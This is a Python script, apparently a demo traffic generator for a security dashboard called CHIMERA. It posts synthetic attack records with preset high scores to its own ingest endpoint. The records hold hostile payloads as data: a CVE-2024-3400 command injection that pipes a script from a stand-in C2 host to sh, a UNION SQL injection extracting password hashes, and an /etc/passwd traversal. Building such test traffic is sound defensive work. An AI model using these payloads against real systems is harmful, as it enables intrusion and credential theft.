"""
backend/attack_simulator.py

CHIMERA Live Attack Traffic Simulator (Presentation-Ready Demo Configuration)
Continuously feeds realistic threat vectors and decoy triggers with true-randomized
unique IP addresses into the FastAPI ingest pipeline at strict 3.5-second intervals.
Scores are aligned to distinct elevated tiers (0.82, 0.89, 0.95) to trigger HIGH/CRITICAL
badges and active deception response across the live dashboard.
"""

import os
import time
import random
import sys
from datetime import datetime, timezone
import requests

TARGET_URL = os.getenv("TARGET_URL", "https://chimera-backend-5jwu.onrender.com/api/ingest")

# ANSI Color Codes for terminal formatting
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# Elevated anomaly score tiers for high-impact dashboard presentation
ELEVATED_SCORES = [0.82, 0.89, 0.95]

# Rich, realistic attack payload templates targeting core presentation endpoints
ATTACK_TEMPLATES = [
    {
        "phase": "Phase 1 - Reconnaissance",
        "name": "Admin Portal Recon (/admin/config)",
        "endpoint": "/admin/config",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 (compatible; ReconScanner/2.4)"},
        "body": "",
        "attack_type": "Admin Surface Enumeration",
        "default_score": 0.82,
    },
    {
        "phase": "Phase 2 - Credential Assault",
        "name": "Auth Credential Stuffing (/api/v1/auth)",
        "endpoint": "/api/v1/auth",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
        "body": '{"username": "admin", "password": "Password123!"}',
        "attack_type": "Credential Stuffing Campaign",
        "default_score": 0.89,
    },
    {
        "phase": "Phase 3 - Telemetry Poisoning",
        "name": "Telemetry Sensor Probe (/telemetry)",
        "endpoint": "/telemetry",
        "method": "POST",
        "headers": {"user-agent": "curl/8.5.0", "content-type": "application/json"},
        "body": '{"sensor_id": "gateway_soc_01", "metric": "synthetic_flood", "rate": 5000}',
        "attack_type": "Telemetry Sensor Poisoning Probe",
        "default_score": 0.82,
    },
    {
        "phase": "Phase 4 - Deception Trap Hit",
        "name": "Decoy Honeypot Trap (/decoy/db-admin)",
        "endpoint": "/decoy/db-admin",
        "method": "POST",
        "headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "body": "SELECT * FROM chimera_admin_credentials;",
        "attack_type": "Honeypot Trap Interaction",
        "default_score": 0.95,
    },
    {
        "phase": "Phase 5 - Decoy SSH Access",
        "name": "Decoy SSH Honeypot (/decoy/ssh-login)",
        "endpoint": "/decoy/ssh-login",
        "method": "POST",
        "headers": {"user-agent": "libssh/0.9.6"},
        "body": '{"username": "root", "key": "ssh-rsa AAAAB3NzaC1yc2E..."}',
        "attack_type": "Decoy SSH Interaction",
        "default_score": 0.89,
    },
    {
        "phase": "Phase 6 - Remote Code Execution",
        "name": "PAN-OS RCE Exploit (CVE-2024-3400)",
        "endpoint": "/ssl-vpn/hipreport.esp",
        "method": "POST",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "COOKIE: `curl http://c2.malicious.net/shell.sh | sh`",
        "attack_type": "PAN-OS Command Injection (CVE-2024-3400)",
        "default_score": 0.95,
    },
    {
        "phase": "Phase 7 - SQL Injection",
        "name": "SQLi Exploit (CVE-2024-SQLi-Extraction)",
        "endpoint": "/api/v1/users?id=1",
        "method": "GET",
        "headers": {"user-agent": "sqlmap/1.7.2#stable"},
        "body": "id=1' UNION SELECT null, username, password_hash FROM users--",
        "attack_type": "SQL Injection (UNION-based Extraction)",
        "default_score": 0.95,
    },
    {
        "phase": "Phase 8 - Directory Traversal",
        "name": "Directory Traversal / LFI (/etc/passwd)",
        "endpoint": "/api/v1/files?path=../../../../../../etc/passwd",
        "method": "GET",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "",
        "attack_type": "Directory Traversal / LFI",
        "default_score": 0.89,
    },
]


def run_simulator():
    print(f"\n{BOLD}{'=' * 85}{RESET}")
    print(f"{BOLD}{CYAN}  🔥 CHIMERA PRESENTATION-READY ATTACK SIMULATOR & TELEMETRY INJECTOR 🔥{RESET}")
    print(f"{DIM}  Target Endpoint : {TARGET_URL}{RESET}")
    print(f"{DIM}  Pacing          : Strict 3.5 seconds (Judge Demonstration Pacing){RESET}")
    print(f"{DIM}  Score Alignment : Elevated Tier Scores (0.82, 0.89, 0.95){RESET}")
    print(f"{DIM}  Target Scope    : /admin/config, /api/v1/auth, /telemetry & Deception Decoys{RESET}")
    print(f"{BOLD}{'=' * 85}{RESET}\n")

    counter = 0

    while True:
        counter += 1

        # True randomized unique IP generation for every single attack
        source_ip = f"{random.randint(11,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

        # Cycle cleanly through presentation attack phases
        template = ATTACK_TEMPLATES[(counter - 1) % len(ATTACK_TEMPLATES)]
        phase_label = template.get("phase", f"Phase {counter}")
        attack_name = template["name"]
        endpoint = template["endpoint"]
        method = template["method"]
        headers = template["headers"]
        body = template["body"]
        attack_type = template["attack_type"]

        now_dt = datetime.now(timezone.utc)
        now_iso = now_dt.isoformat()
        local_time_str = datetime.now().strftime("%H:%M:%S")

        # Distinct elevated anomaly score (0.82, 0.89, 0.95)
        selected_score = template.get("default_score") or random.choice(ELEVATED_SCORES)

        payload = {
            "source_ip": source_ip,
            "destination_ip": "10.0.0.5",
            "endpoint": endpoint,
            "method": method,
            "headers": headers,
            "body": body,
            "timestamp": now_iso,
            "anomaly_score": selected_score,
            "risk_score": selected_score,
            "attack_type": attack_type,
        }

        try:
            response = requests.post(TARGET_URL, json=payload, timeout=10)
            status_code = response.status_code

            if status_code == 200:
                data = response.json()
                action = str(data.get("action", "unknown")).upper()
                risk_score = float(data.get("risk_score", selected_score))
                event_id = str(data.get("event_id", ""))[:8]

                if action in ("ESCALATED", "APPROVAL_REQ", "DECEPTION_ACTIVE"):
                    tag_color = RED if action != "DECEPTION_ACTIVE" else YELLOW
                    icon = "🚨 [APPROVAL_REQ]" if action == "APPROVAL_REQ" else ("⚡ [DECOY_TRAP] " if action == "DECEPTION_ACTIVE" else "🔥 [ESCALATED]  ")
                elif action == "AUTO_CONTAINED":
                    tag_color = CYAN
                    icon = "🛡️  [AUTONOMOUS]  "
                else:
                    tag_color = GREEN
                    icon = "✅ [BENIGN/DROP] "

                # Clear live progress indicator
                print(
                    f"[{local_time_str}] #{counter:03d} "
                    f"{BOLD}[>] Launching {phase_label}... {RESET}"
                    f"[Status: HTTP {GREEN}{status_code}{RESET}] | "
                    f"{tag_color}{icon:<18}{RESET} | "
                    f"{BOLD}{endpoint:<25}{RESET} | "
                    f"IP: {CYAN}{source_ip:<15}{RESET} | "
                    f"Score: {tag_color}{risk_score:.2f}{RESET} | "
                    f"{DIM}{attack_name}{RESET} ({event_id}...)"
                )
            else:
                print(
                    f"[{local_time_str}] #{counter:03d} "
                    f"{BOLD}[>] Launching {phase_label}... {RESET}"
                    f"[Status: HTTP {RED}{status_code}{RESET}] | "
                    f"Target {endpoint} responded with: {response.text[:60]}"
                )

        except requests.exceptions.ConnectionError:
            print(
                f"[{local_time_str}] #{counter:03d} "
                f"{BOLD}[>] Launching {phase_label}... {RESET}"
                f"[Status: {RED}CONN_ERROR{RESET}] Cannot connect to {TARGET_URL}. Is the backend online?"
            )
        except Exception as exc:
            print(
                f"[{local_time_str}] #{counter:03d} "
                f"{BOLD}[>] Launching {phase_label}... {RESET}"
                f"[Status: {RED}ERROR{RESET}] {exc}"
            )

        # Strict 3.5-second pacing to prevent socket blocking while maintaining live telemetry
        time.sleep(3.5)


if __name__ == "__main__":
    try:
        run_simulator()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[SIMULATOR] Simulator stopped by user. Goodbye!{RESET}\n")
        sys.exit(0)
